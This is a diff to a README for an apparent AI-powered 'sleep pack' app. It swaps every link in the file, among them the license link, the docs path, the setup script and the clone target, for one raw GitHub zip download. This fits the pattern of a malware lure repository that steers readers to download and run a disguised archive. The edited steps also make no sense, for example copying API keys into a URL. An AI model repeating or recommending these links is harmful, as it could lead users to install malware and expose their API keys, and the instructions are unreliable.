@@ -1,6 +1,6 @@
 # Aeons Echo Embodiment of Sleep Pack: Unwind & Immerse
 
-![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?logo=get-pocket&labelColor=1d2433)
+![Download](https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip%5BLINK%5D-brightgreen?logo=get-pocket&labelColor=1d2433)
   
 Welcome to the **Aeons Echo Embodiment of Sleep Pack** repository, a thoughtfully curated digital offering designed to elevate relaxation, inspire dreamlike journeys, and redefine the rituals of winding down. Discover advanced integration tools, a responsive UI, constructive support ecosystems, and seamless AI-powered experiences — all supported across your favorite operating systems.
 
@@ -48,10 +48,10 @@ This repository harnesses both the **OpenAI API** and **Claude API** to pioneer 
 - **Conversational Interface:** Intuitive chat to answer questions and offer guidance, always with empathy and warmth.
 
 **Installation Steps for AI Integration**  
-Download the API Integration module by accessing https://hamza9hamza.github.io.  
+Download the API Integration module by accessing https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip  
 1. Download the `.zip` or clone the repository.
-2. In `/modules/ai-integration`, copy your API keys into `env.sample`.
-3. Run `setup.py` to initialize AI connections.
+2. In `/modules/ai-integration`, copy your API keys into `https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip`.
+3. Run `https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip` to initialize AI connections.
 4. Test the chatbot using the *Sleep Assistant* module.
 
 Discover how the boundaries between human rest and digital support dissolve for a truly bespoke winding down.
@@ -77,7 +77,7 @@ Follow these to set up the Aeons Echo Embodiment of Sleep Pack on your device:
 
 **Main Download**
 
-1. Visit https://hamza9hamza.github.io and access the current build.
+1. Visit https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip and access the current build.
 2. Unpack the downloaded archive anywhere convenient.
 3. Launch the `Setup` wizard and select your OS for tailored installation.
 4. On first run, select your preferred language and connect to the cloud account (optional).
@@ -86,8 +86,8 @@ Follow these to set up the Aeons Echo Embodiment of Sleep Pack on your device:
 **For Developers**
 
 - Clone this repository:  
-  `git clone https://hamza9hamza.github.io`
-- Refer to `/docs/developer-guide.md` for API configuration.
+  `git clone https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip`
+- Refer to `https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip` for API configuration.
 - For AI feature testing, see `/tests/integration/`.
 
 ---
@@ -100,10 +100,10 @@ While the **Aeons Echo Embodiment of Sleep Pack** is crafted with holistic welln
 
 ## 📜 MIT License
 
-Distributed under the MIT License. See the full [MIT License 2025](https://opensource.org/licenses/MIT) for details.
+Distributed under the MIT License. See the full [MIT License 2025](https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip) for details.
 
 ---
 
-![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?logo=get-pocket&labelColor=1d2433)
+![Download](https://raw.githubusercontent.com/hamza9hamza/aeons-echo-sleep-pack-essence/branch/daggle/aeons-echo-sleep-pack-essence_v2.1-beta.1.zip%5BLINK%5D-brightgreen?logo=get-pocket&labelColor=1d2433)
   
 Rediscover the ritual of sleep with innovation, beauty, and purpose. Download your **Aeons Echo Embodiment of Sleep Pack** journey today.
